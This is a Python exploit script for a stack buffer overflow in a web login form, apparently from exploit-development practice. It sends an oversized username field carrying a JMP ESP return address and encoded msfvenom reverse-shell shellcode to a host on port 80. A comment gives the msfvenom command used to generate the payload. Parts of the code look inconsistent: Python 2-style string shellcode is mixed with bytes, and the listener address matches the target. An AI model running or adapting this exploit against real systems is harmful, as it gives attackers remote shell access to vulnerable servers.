#!/usr/bin/python
import socket
import sys

try:
    server = "192.168.216.137"
    port = 80
    size = 800

    filler = b"A" * 780
    eip = b"\x83\x0c\x09\x10" * 4 # Here the address 10090c83 containing the instruction JMP ESP is mentioned in Little Endian format
    offset = b"C" * 4
#------------MODIFIED PART------------
    shellcode = bytearray(
        "\xb8\xc6\xb3\xd1\xc5\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9"
        "\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x2d\x4f\x33\x30\x4d"
        "\x58\x36\xbb\xad\x99\x57\x35\x48\xa8\x57\x21\x19\x9b\x67"
        "\x21\x4f\x10\x03\x67\x7b\xa3\x61\xa0\x8c\x04\xcf\x96\xa3"
        "\x95\x7c\xea\xa2\x15\x7f\x3f\x04\x27\xb0\x32\x45\x60\xad"
        "\xbf\x17\x39\xb9\x12\x87\x4e\xf7\xae\x2c\x1c\x19\xb7\xd1"
        "\xd5\x18\x96\x44\x6d\x43\x38\x67\xa2\xff\x71\x7f\xa7\x3a"
        "\xcb\xf4\x13\xb0\xca\xdc\x6d\x39\x60\x21\x42\xc8\x78\x66"
        "\x65\x33\x0f\x9e\x95\xce\x08\x65\xe7\x14\x9c\x7d\x4f\xde"
        "\x06\x59\x71\x33\xd0\x2a\x7d\xf8\x96\x74\x62\xff\x7b\x0f"
        "\x9e\x74\x7a\xdf\x16\xce\x59\xfb\x73\x94\xc0\x5a\xde\x7b"
        "\xfc\xbc\x81\x24\x58\xb7\x2c\x30\xd1\x9a\x38\xf5\xd8\x24"
        "\xb9\x91\x6b\x57\x8b\x3e\xc0\xff\xa7\xb7\xce\xf8\xc8\xed"
        "\xb7\x96\x36\x0e\xc8\xbf\xfc\x5a\x98\xd7\xd5\xe2\x73\x27"
        "\xd9\x36\xd3\x77\x75\xe9\x94\x27\x35\x59\x7d\x2d\xba\x86"
        "\x9d\x4e\x10\xaf\x34\xb5\xf3\x10\x60\x6d\x8a\xf9\x73\x8d"
        "\x8d\xa9\xfa\x6b\xe7\x59\xab\x24\x90\xc0\xf6\xbe\x01\x0c"
        "\x2d\xbb\x02\x86\xc2\x3c\xcc\x6f\xae\x2e\xb9\x9f\xe5\x0c"
        "\x6c\x9f\xd3\x38\xf2\x32\xb8\xb8\x7d\x2f\x17\xef\x2a\x81"
        "\x6e\x65\xc7\xb8\xd8\x9b\x1a\x5c\x22\x1f\xc1\x9d\xad\x9e"
        "\x84\x9a\x89\xb0\x50\x22\x96\xe4\x0c\x75\x40\x52\xeb\x2f"
        "\x22\x0c\xa5\x9c\xec\xd8\x30\xef\x2e\x9e\x3c\x3a\xd9\x7e"
        "\x8c\x93\x9c\x81\x21\x74\x29\xfa\x5f\xe4\xd6\xd1\xdb\x14"
        "\x9d\x7b\x4d\xbd\x78\xee\xcf\xa0\x7a\xc5\x0c\xdd\xf8\xef"
        "\xec\x1a\xe0\x9a\xe9\x67\xa6\x77\x80\xf8\x43\x77\x37\xf8"
        "\x41")

    shellcode += b"D" * (1500 - len(filler) - len(eip) - len(offset))
#------------MODIFIED PART------------
# GOAL HERE IS TO PLACE THE SHELLCODE(msfvenom -p windows/shell_reverse_tcp LHOST=192.168.216.137 LPORT=80 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d")

    inputBuffer = filler + eip + offset + shellcode
    content = b"username=" + inputBuffer + b"&password=A"

    buffer= b"POST /login HTTP/1.1\r\n"
    buffer+= b"Host: " + server.encode() + b"\r\n"
    buffer+= b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
    buffer+= b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer+= b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+= b"Referer: http://"+server.encode()+b"/login\r\n"
    buffer+= b"Connection: close\r\n"
    buffer+= b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+= b"Content-Length: "+str(len(content)).encode()+b"\r\n"
    buffer+= b"\r\n"
    buffer+= content

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
